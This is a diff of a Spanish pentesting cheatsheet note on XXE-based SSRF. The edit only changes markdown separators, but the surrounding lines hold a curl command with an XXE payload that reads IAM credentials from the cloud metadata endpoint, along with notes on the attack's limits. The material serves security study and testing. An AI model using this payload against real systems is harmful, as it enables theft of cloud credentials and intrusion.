@@ -17,7 +17,7 @@ linked:
 ---
 # XXE - Clásico SSRF
 
-***
+---
 
 ## Cheatsheet
 
@@ -54,7 +54,7 @@ curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
   '<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">]><foo>&x;</foo>'
 ```
 
-___
+---
 
 ## Overview
 
@@ -67,4 +67,4 @@ Si el valor de la entidad externa es una URL HTTP/HTTPS (en vez de `file://`), e
 - **Métodos:** solo `GET`. Sin POST/PUT/DELETE — limita exploits a endpoints idempotentes.
 - **Caracteres XML-rompedores:** si la respuesta interna contiene `<`/`&`, parser falla → pivotar a [[XXE - Out-of-Band (OOB) y DTDs Externos]].
 
-***
+---
